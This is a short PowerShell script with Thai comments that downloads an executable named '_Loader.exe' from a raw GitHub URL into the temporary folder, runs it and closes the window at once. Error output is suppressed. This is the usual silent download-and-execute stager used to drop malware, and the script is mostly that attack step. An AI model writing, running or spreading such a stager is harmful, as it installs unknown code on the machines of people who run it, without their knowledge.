$ErrorActionPreference = "SilentlyContinue"

# 1. ลิงก์ตรงของไฟล์ _Loader.exe (ต้องแก้ให้ตรงกับลิงก์ไฟล์ของคุณจริงๆ)
$url = "https://raw.githubusercontent.com/lubyralph6-maker/newpower.ps1/main/_Loader.exe"
$dest = "$env:TEMP\_Loader.exe"

# 2. ดาวน์โหลดไฟล์มาไว้ในเครื่องชั่วคราว
Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing

# 3. รันโปรแกรมหลักขึ้นมา และปิดหน้า PowerShell ทันที
if (Test-Path $dest) {
    Start-Process -FilePath $dest
    exit
}
